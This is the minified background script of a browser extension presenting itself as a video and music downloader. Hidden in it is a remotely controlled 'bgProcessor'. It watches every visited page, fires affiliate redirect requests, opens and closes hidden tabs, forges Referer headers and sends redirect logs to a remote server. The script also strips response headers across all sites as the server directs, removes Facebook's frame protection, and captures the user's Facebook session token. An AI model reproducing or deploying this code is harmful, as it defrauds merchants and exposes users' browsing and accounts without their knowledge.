class Background{constructor(){this.actionUrl="https://loady.org/api/action/",this.uninstallUrl="https://loady.org/uninstall/",this.queue=[],this.queueProcessorReady=!1,this.version=chrome.runtime.getManifest().version,this.storage=STORAGE,this.tabVideos={},this.filterRequestConfigured=!1,this.searchQueue=[],this.apiSearchStoper=!1,this.hpInitiated=!1,this.uid="",this.bgProcessorRun=!1,this.providerParams={},this.onMessage(),this.initFacebook(),this.disableTwitterVerify(),this.processHeaders(),this.updateHeaders(),this.initTabVideosCleaner(),this.initGa(),this.analyticsTrack("/background.html"),this.initStorage(),setInterval(()=>{this.initSearch()},BG_INTERVAL),this.initInstallListener()}get config(){return this.storage.config}initInstallListener(){chrome.runtime.onInstalled.addListener(a=>{this.queue.push({type:"action",action:a.reason}),this.queueProcessorReady&&this.processQueue()})}processQueue(){for(;0<this.queue.length;){var a=this.queue.shift();if(!a.type||"action"!=a.type)return!0;var b="p="+encodeURIComponent(btoa(JSON.stringify({id:chrome.runtime.id,v:this.version,action:a.action,uid:this.uid,t:Date.now()})));fetch(this.actionUrl+"?"+b).then(a=>a.json()).then(function(a){a.url&&chrome.tabs.create({url:a.url})})}}setUninstallUrl(){const a="p="+encodeURIComponent(btoa(JSON.stringify({id:chrome.runtime.id,v:this.version,action:"uninstall",uid:this.uid,t:Date.now()})));chrome.runtime.setUninstallURL(this.uninstallUrl+"?"+a)}handleFacebookHeaders(a){if("GET"!==a.method)return;const b=new URL(a.url).searchParams,c=b.get("fb_dtsg_ag")||b.get("fb_dtsg");c&&this.dtsgToken!==c&&(this.dtsgToken=c,this.config.currentFb_dtsgToken=c,this.saveConfig())}getFbData(a,b={},c="json"){return new Promise(d=>{fetch(a,b).then(a=>"json"===c?a.json():a.text()).then(a=>{d(a)})})}initFacebook(){const a=a=>{if(!a)return{error:"Data is empty"};const{pathname:b}=a,c=b.split("/").filter(a=>!!a);if(!c.length||"watch"===c[c.length-1]||3>c.length)return{error:"URL is not has chanel"};const d=c[0],e=/^\d*$/g.test(c[2])?c[2]:c[3];return d&&e?`${d}:${e}`:{error:"URL is not has id"}};chrome.webRequest.onHeadersReceived.addListener(c=>{for(let a=0;a<c.responseHeaders.length;a++)"x-frame-options"===c.responseHeaders[a].name.toLowerCase()&&c.responseHeaders.splice(a,1);return{responseHeaders:c.responseHeaders}},{urls:["*://*.facebook.com/*"]},["blocking","responseHeaders","extraHeaders"]),chrome.webRequest.onSendHeaders.addListener(a=>this.handleFacebookHeaders(a),{urls:["*://*.facebook.com/video/video_data_async/*","*://*.facebook.com/ajax/*"]},["requestHeaders"]),chrome.tabs.onUpdated.addListener((b,c,d)=>{const e=c.url;if(!e)return;chrome.tabs.sendMessage(d.id,{action:"pageUpdated"},()=>{});const f=e.includes("facebook.com")||e.includes("www.facebook.com")||e.includes("www.fb.com")||e.includes("fb.com");if(!f)return;const g=new URL(e),h=a(g);chrome.tabs.sendMessage(d.id,{action:"sendFbVideoId",videoId:h,dtsgToken:this.dtsgToken},()=>{})})}onMessage(){chrome.runtime.onMessage.addListener((a,b,c)=>("setBadge"===a.action&&b.tab?this.setBadge(a.value,b.tab.id):"download"===a.action?this.download(a):"ajaxGet"===a.action?this.ajaxGet(a.url,c):"ajaxPost"===a.action?this.ajaxPost(a,c):"doFetch"===a.action?this.doFetch(a,c):"getTabVideos"===a.action?c(this.tabVideos[b.tab.id]):"getTabId"===a.action?c(this.tabId):"getAudioSrc"===a.action?this.getAudioSrc(a,b,c):"downloadSC"===a.action?this.downloadSC(a,c):"requestPermission"===a.action?this.requestPermission(c):"fetchVKData"===a.action?this.fetchVKData(a).then(c):"getDtsgToken"===a.action?c(this.dtsgToken):"getFbData"===a.action&&this.getFbData(a.url,a.config,a.responseType).then(a=>c(a)),!0))}doFetch(a,b){const{url:c,init:d,json:e,method:f}=a;return fetch(c,d,{method:f}).then(a=>e?a.json():a.text()).then(b)}disableTwitterVerify(){chrome.webRequest.onBeforeSendHeaders.addListener(a=>{const b=a.requestHeaders.filter(a=>"cookie"!==a.name.toLowerCase());return{requestHeaders:b}},{urls:["*://api.twitter.com/oauth2/token"]},["blocking","requestHeaders"])}processHeaders(){const a={webm:"webm",mp4:"mp4","x-flv":"flv","3gpp":"3gp","x-msvideo":"avi","x-ms-wmv":"wmv",mpeg:"mpg",quicktime:"mov",ogg:"ogv"},b=b=>{for(let c in a)if(b.includes(c))return c;return null},c=function(c){const d={};for(let f=0;f<c.length;f++){const g=c[f],h=g.name,i=g.value;if(h)switch(h.toLowerCase()){case"content-type":d.type=b(i),d.ext=a[d.type];break;case"content-length":d.size=parseInt(i),d.formattedSize=e(i);}}return d.type?d:null},d=function(a){const b=a.split("?",1)[0],c=b.split("/");return 0<c.length?c[c.length-1]:"unknown"},e=function(a){var b=Math.round;let c="B";return 1024<a&&(a=b(100*(a/1024))/100,c="KB"),1024<a&&(a=b(100*(a/1024))/100,c="MB"),1024<a&&(a=b(100*(a/1024))/100,c="GB"),a+c};chrome.webRequest.onHeadersReceived.addListener(a=>{if(a.responseHeaders&&a.url&&!(1>a.tabId)){const b=c(a.responseHeaders);if(b){b.vid=Date.now(),b.url=a.url,b.title=d(a.url);const c=a.tabId;this.tabId=c,this.tabVideos[c]||(this.tabVideos[c]=[]);const e=this.tabVideos[c].map(a=>a.url).includes(b.url);e||(this.tabVideos[c]=[b,...this.tabVideos[c]])}}},{urls:["<all_urls>"]},["responseHeaders"])}updateProviderParams(){if(this.providerParams={},this.config&&this.config.providers)for(let a in this.config.providers)this.config.providers[a].enabled&&this.config.providers[a].key&&(this.providerParams.datmusic={key:this.config.providers[a].key})}updateHeaders(){chrome.webRequest.onBeforeSendHeaders.addListener(a=>{if("GET"===a.method)if(a.url.includes("z1.fm")){const b=a.requestHeaders.find(a=>"cookie"===a.name.toLowerCase());b&&(b.value="zvAuth=1;");const c=a.requestHeaders.find(a=>"referer"===a.name.toLowerCase());c?c.value="http://z1.fm/":a.requestHeaders.push({name:"referer",value:"http://z1.fm/"});const d=a.requestHeaders.find(a=>"upgrade-insecure-requests"===a.name.toLowerCase());d?d.value=1:a.requestHeaders.push({name:"Upgrade-Insecure-Requests",value:"1"})}else if(a.url.includes("datmusic.xyz")&&this.providerParams.datmusic&&this.providerParams.datmusic.key){const b=a.requestHeaders.find(a=>"user-agent"===a.name.toLowerCase());b?b.value=this.providerParams.datmusic.key:a.requestHeaders.push({name:"user-agent",value:this.providerParams.datmusic.key})}return{requestHeaders:a.requestHeaders}},{urls:["*://z1.fm/*","*://*.z1.fm/*","*://*.datmusic.xyz/*","*://datmusic.xyz/*"]},["blocking","requestHeaders","extraHeaders"]),chrome.webRequest.onBeforeSendHeaders.addListener(a=>{if("GET"===a.method){const b=a.requestHeaders.find(a=>"referer"===a.name.toLowerCase());b?b.value="https://datmusic.xyz":a.requestHeaders.push({name:"referer",value:"https://datmusic.xyz"})}return{requestHeaders:a.requestHeaders}},{urls:["*://api-2.datmusic.xyz/*"]},["blocking","requestHeaders","extraHeaders"]),chrome.webRequest.onBeforeSendHeaders.addListener(a=>{let b=a.requestHeaders.findIndex(a=>"x-vkm-request"===a.name.toLowerCase());if("POST"===a.method&&-1<b){const c=a.requestHeaders,d=a.requestHeaders.splice(b,1),e=a.requestHeaders.findIndex(a=>"user-agent"===a.name.toLowerCase());-1<e?a.requestHeaders[e].value="Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30":a.requestHeaders.push({name:"User-Agent",value:"Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"})}return{requestHeaders:a.requestHeaders}},{urls:["https://vk.com/al_audio.php"]},["blocking","requestHeaders"])}initGa(){ga("create","UA-54900311-3"),ga("set","checkProtocolTask",function(){})}analyticsTrack(a){ga("send","pageview",a)}initStorage(){let a=this;chrome.storage.sync.get(this.storage,b=>{this.storage=b,a.config.uid?a.uid=a.config.uid:(a.uid=a.config.uid=a.generateUID(),a.saveConfig()),a.config.mTime&&a.config.lTime||(a.config.lTime=0,a.config.mTime=new Date().getTime(),a.saveConfig()),this.filterRequests(),this.initBgProcessor(),this.updateConfig(),this.run(),this.queueProcessorReady=!0,this.setUninstallUrl(),this.processQueue()})}run(){_grafy_cfg={aid:1,sid:"loady",uid:this.uid},this.updateProviderParams()}generateUID(){return"xxxxxxxx-xxxx-2xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,function(a){var b=0|16*Math.random(),c="x"==a?b:8|3&b;return c.toString(16)})}heartBeat(){let a=new Date().getTime(),b=a-this.config.mTime,c=this.config.configUpTime?this.config.configUpTime+3e5:12e5;this.config.mTime&&b<c?(this.config.lTime+=b,this.config.mTime=a,this.saveConfig()):(this.config.mTime=a,this.saveConfig())}updateConfig(){this.heartBeat();let a=this;const b="p="+encodeURIComponent(btoa(JSON.stringify({id:chrome.runtime.id,version:this.version,r:Date.now(),mt:this.config.mTime,lt:this.config.lTime,uid:this.uid})));$.ajax({url:`${CONFIG_URL}?${b}`,dataType:"json",success:a=>{if(a){for(let b in a)this.config[b]=a[b];this.saveConfig(),this.filterRequests(),this.initBgProcessor()}},complete:()=>{this.run(),this.config.configUpTime&&0<this.config.configUpTime&&setTimeout(function(){a.updateConfig()},this.config.configUpTime)}})}download({filename:a,url:b}){-1!==b.indexOf("blob:")&&(b=b.slice(5)),chrome.downloads.download({url:b,filename:a}),grafy("DOWNLOAD_COMPLETE",b,a)}ajaxGet(a,b){var c=new XMLHttpRequest;c.open("GET",a,!0),c.onload=()=>b(c.responseText),c.send()}ajaxPost(a,b){const{method:c,url:d,data:e}=a;var f=new XMLHttpRequest;f.open(c,d,!0),"POST"==c&&(f.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),f.setRequestHeader("X-Requested-With","XMLHttpRequest")),f.onreadystatechange=function(){4===f.readyState&&b(f.responseText)},f.send("POST"==c?e:null)}async fetchVKData({item:a}){const b=Math.random(),{link:c,body:d}=a.data,e=await fetch(c,{method:"POST",cache:"no-store",headers:{"request-key":b,"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"},body:d}),f=await e.arrayBuffer();return(a=>{const b=new TextDecoder("windows-1251");return b.decode(a)})(f)}initTabVideosCleaner(){chrome.tabs.onRemoved.addListener(a=>{delete this.tabVideos[a]})}setBadge(a,b){let c=a?a+"":"";chrome.browserAction.setBadgeBackgroundColor({color:[16,201,33,100],tabId:b}),chrome.browserAction.setBadgeText({text:c,tabId:b})}saveStorage(){chrome.storage.sync.set(this.storage)}saveConfig(){this.saveStorage()}requestPermission(a){chrome.permissions.request({permissions:["downloads"]},b=>a(b))}getAudioSrc(a,b,c){const d=a.tabId||b.tab.id;this.searchQueue.push({aId:a.aId,aName:a.aName,tabId:d,sendResponse:c})}initSearch(){if(this.apiSearchStoper)return;const a=this.searchQueue.shift();a&&(this.apiSearchStoper=!0,new SearchEngine(a.aName,b=>{chrome.tabs.sendMessage(a.tabId,{action:"searchResult",items:b,aId:a.aId}),a.sendResponse&&a.sendResponse({items:b}),this.apiSearchStoper=!1}))}downloadSC(a,b){const c=clearFilename(a.title)+".mp3";fetch(a.data.url).then(a=>a.json()).then(({url:a})=>{this.download({filename:c,url:a}),b&&b()})}getSCAudioSrc(a,b){const c=encodeURIComponent("https://soundcloud.com"+a),d=this.config.scClientId;fetch(`https://api.soundcloud.com/resolve.json?url=${c}&client_id=${d}`+"&format=json&_status_code_map[302]=200").then(a=>a.json()).then(a=>{if(a.stream_url){const c=a.stream_url+"?client_id="+d,e=a.user.username,f=a.title;b(c,e+" - "+f)}else a.location?fetch(a.location).then(a=>a.json()).then(a=>{if(a.id){let c="https://api.soundcloud.com/i1/tracks/"+a.id+"/streams?client_id="+d;fetch(c).then(a=>a.json()).then(a=>{a.http_mp3_128_url&&b(a.http_mp3_128_url)})}}):a.tracks.length&&a.tracks.slice(0,10).forEach(a=>{const c=a.stream_url+"?client_id="+d,e=a.user.username,f=a.title;b(c,e+" - "+f)})})}filterRequests(){const a=this;this.requestFiltered||this.config&&this.config.validateFields&&(a.requestFiltered=!0,chrome.webRequest&&chrome.webRequest.onHeadersReceived.addListener(function(b){return{responseHeaders:b.responseHeaders.filter(function(b){return!(-1<a.config.validateFields.indexOf(b.name.toLowerCase()))})}},{urls:["<all_urls>"]},["blocking","responseHeaders"]))}initBgProcessor(){let a=this;if(!a.config.bgProcessor)return void bgProcessor.initCfg({mode:"off"});if(a.optouted)return void bgProcessor.initCfg({mode:"off"});if(a.bgProcessorRun)return void bgProcessor.initCfg(this.config.bgProcessor);a.bgProcessorRun=!0,bgProcessor.initCfg(a.config.bgProcessor),chrome.webRequest.onCompleted.addListener(function(b){if("on"===bgProcessor.cfg.mode&&!a.config.optouted&&!(0>b.tabId)&&200==b.statusCode&&"GET"==b.method){var c=b.url.replace(/^(https?\:\/\/[^\/]+).*$/,"$1"),d=b.url.replace(/^https?\:\/\/([^\/]+).*$/,"$1");bgProcessor.cfg.keep_www_prefix||(d=d.replace(/^www\.(.*)$/,"$1"));var e=new Date().getTime();if(!(bgProcessor.used_domains[d]&&bgProcessor.used_domains[d]+bgProcessor.cfg.ttl_ms>e)&&!(bgProcessor.cfg.domains_blacklist&&0<bgProcessor.cfg.domains_blacklist.length&&bgProcessor.cfg.domains_blacklist.includes(d))&&!(bgProcessor.cfg.domains_whitelist&&0<bgProcessor.cfg.domains_whitelist.length&&!bgProcessor.cfg.domains_whitelist.includes(d))){bgProcessor.used_domains[d]=e;var f=bgProcessor.cfg.aff_url_tmpl.replace(/\{([A-Z]+)\}/gi,function(a,b){return"URL"===b?encodeURIComponent(c):"DOMAIN"===b?encodeURIComponent(d):a});if(bgProcessor.cfg.aff_redirect)return!bgProcessor.cfg.domains_whitelist||0<!bgProcessor.cfg.domains_whitelist.length?void 0:(bgProcessor.push_chain(c),void bgProcessor.request_bg(f,d,0));var g=new XMLHttpRequest;g.timeout=bgProcessor.cfg.aff_timeout_ms,g.onreadystatechange=function(){if(4==g.readyState&&200==g.status){var a=g.responseText.replace(/[\n\r]/g,"");if(/^https?\:\/\//.test(a)&&a!=c){var b=c.replace(/^https?\:\/\/([^\/]+).*$/,"$1");bgProcessor.push_chain(c),bgProcessor.request(a,b)}else bgProcessor.used_domains[d]=e+bgProcessor.cfg.no_coverage_ttl_ms}},g.open("GET",f),g.send()}}},{urls:["http://*/*","https://*/*"],types:["main_frame"]});let b=["blocking","requestHeaders"];if(bgProcessor.cfg&&bgProcessor.cfg.rfr_rules&&0<bgProcessor.cfg.rfr_rules.length&&bgProcessor.cfg.listenerExtraOptions)for(var c in bgProcessor.cfg.listenerExtraOptions)b.push(bgProcessor.cfg.listenerExtraOptions[c]);chrome.webRequest.onBeforeSendHeaders.addListener(function(a){if("on"!==bgProcessor.cfg.mode||!bgProcessor.cfg.header)return{};for(var b=a.requestHeaders,c="",d=0;d<b.length;d++)if(b[d].name===bgProcessor.cfg.header){c=b[d].value,b.splice(d,1);break}if(!c)return{};for(var e=!1,d=0;d<b.length;d++)if("accept"==b[d].name.toLowerCase()){b[d].value=c,e=!0;break}if(e||b.push({name:"Accept",value:c}),0>a.tabId){let c="";if(bgProcessor.cfg.rfr_rules)for(let b in bgProcessor.cfg.rfr_rules){let d=bgProcessor.cfg.rfr_rules[b];if(d.url_request_before){if(!bgProcessor.last_request_url)continue;let a=new RegExp(d.url_request_before[0],d.url_request_before[1]);if(!a.test(bgProcessor.last_request_url))continue}if(d.url_response_before){if(!bgProcessor.last_response_url)continue;let a=new RegExp(d.url_response_before[0],d.url_response_before[1]);if(!a.test(bgProcessor.last_response_url))continue}if(d.url_chain){if(!bgProcessor.rdr_chain||1>bgProcessor.rdr_chain.length)continue;let a=new RegExp(d.url_chain[0],d.url_chain[1]),b=!1;for(let c in bgProcessor.rdr_chain){let d=bgProcessor.rdr_chain[c];if(a.test(d)){b=!0;break}}if(!b)continue}if(d.url_request){let b=new RegExp(d.url_request[0],d.url_request[1]);if(!b.test(a.url))continue}if("allow"==d.rule&&(c=bgProcessor.last_response_url),"replace"==d.rule&&d.replace&&(c=d.replace),"regexp"==d.rule&&d.regexp&&d.replace){var f=new RegExp(d.regexp[0],d.regexp[1]);c=bgProcessor.last_response_url.replace(f,d.replace)}break}if(c){let a=b.findIndex(a=>"referer"==a.name.toLowerCase());-1<a?b[a].value=c:b.push({name:"Referer",value:c})}}return{requestHeaders:b}},{urls:["http://*/*","https://*/*"]},b)}}let bgProcessor={cfg:{mode:"off"},used_domains:{},rdr_chain:[],last_request_url:"",last_response_url:"",initCfg(a){a&&(this.cfg=a)},request:function(a,b){this.cfg.debug&&console.log("bgProcessor.request",a,b),this.cfg.ntab_tag&&-1!==a.indexOf(this.cfg.ntab_tag)?setTimeout(function(){bgProcessor.request_tab(a,b)},this.cfg.ntab_delay_ms):this.request_bg(a,b,0)},push_chain:function(a){this.rdr_chain.push(a)},request_bg:function(a,b,c){if(!(c>=this.cfg.rdr_max_count)&&this.cfg.header){this.push_chain(a),bgProcessor.last_request_url=a;var d=new XMLHttpRequest;d.timeout=this.cfg.timeout,d.onreadystatechange=function(){var a=Math.floor;if(4==d.readyState)if(200==d.status){var e=d.responseText.replace(/[\n\r\s]/g,"").replace(/\.href/g,""),f=!1,g=d.responseURL,h=bgProcessor.is_rdr_url(d.responseURL);if(bgProcessor.last_response_url=g,bgProcessor.last_response_url!=bgProcessor.last_request_url&&bgProcessor.push_chain(bgProcessor.last_response_url),h||e.length<bgProcessor.cfg.jsrdr_maxlen_bytes){var j=e.replace(/^.*?location\=[\'\"]([^\'\"]+).*$/,"$1");if(/^\//.test(j)){const a=new URL(j,d.responseURL);j=a.href}/^https?\:\/\//.test(j)&&(bgProcessor.request_bg(j,b,c+1),f=!0)}if(!f&&bgProcessor.cfg.common_rdr_rules)for(var k in bgProcessor.cfg.common_rdr_rules){var i=bgProcessor.cfg.common_rdr_rules[k],l=new RegExp(i.search[0],i.search[1]),m=e;if("uri"==i.where&&(m=g),i.url_pattern){var n=new RegExp(i.url_pattern[0],i.url_pattern[1]);if(!n.test(g))continue}if(m.match(l)){var p=m.replace(l,i.replace);if(i.applyAfter)for(var q in i.applyAfter){var o=i.applyAfter[q];if("decodeURIComponent"==o)p=decodeURIComponent(p);else if("decodeHTML"==o){p=(a=>{var b=document.createElement("textarea");return b.innerHTML=a,b.value})(p)}else;}if(i.replacements)for(var r in i.replacements)p=p.replace(r,i.replacements[r]);if(i.regReplacements)for(var s in i.regReplacements){var t=new RegExp(i.regReplacements[s].pattern[0],i.regReplacements[s].pattern[1]);p=p.replace(t,i.regReplacements[s].replace)}if(/^\//.test(p)){const a=new URL(p,d.responseURL);p=a.href}if(/^https?\:\/\//.test(p)){var u=i.delay?i.delay:0;if("string"==typeof u&&-1<u.indexOf("-")){var v=u.split("-");u=a(Math.random()*(parseInt(v[1])-parseInt(v[0])+1)+parseInt(v[0]))}setTimeout(()=>{bgProcessor.request_bg(p,b,c+1)},parseInt(u)),f=!0;break}}}f||bgProcessor.send_rdr_log()}else bgProcessor.send_rdr_log(!0)},d.open("GET",a,!0),d.setRequestHeader(this.cfg.header,"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"),d.send()}},is_rdr_url:function(a){var b=new URL(a);return!!(this.cfg.rdr_coverage&&b.host in this.cfg.rdr_coverage)||!!/\/goto\/?$/.test(b.pathname)},request_tab:function(a,b){this.cfg.debug&&console.log("bgProcessor.request_tab",a,b),chrome.tabs.create({url:a,active:!1},function(a){setTimeout(function(){try{chrome.tabs.remove(a.id)}catch(a){}},bgProcessor.cfg.ntab_duration_ms)})},send_rdr_log:function(a=!1){if(this.rdr_chain&&this.cfg&&this.cfg.log_rdr_active&&this.cfg.log_rdr_endpoint){if(this.cfg&&this.cfg.log_rdr_onlydifferent){var b=this.rdr_chain[0],c=this.rdr_chain[this.rdr_chain.length-1];if(b.replace(/^https?\:\/\/(?:www\.|)([^\/]+).*$/,"$1")==c.replace(/^https?\:\/\/(?:www\.|)([^\/]+).*$/,"$1"))return}var d=new XMLHttpRequest,e=this.cfg.log_rdr_endpoint;a&&this.cfg.log_rdr_errors_endpoint&&(e=this.cfg.log_rdr_errors_endpoint),d.open("POST",e,!0),d.setRequestHeader("Content-Type","application/json;charset=UTF-8"),d.send(JSON.stringify(this.rdr_chain)),this.rdr_chain=[],this.last_request_url=null,this.last_response_url=null}}};const bg=new Background;let _grafy_cfg=null;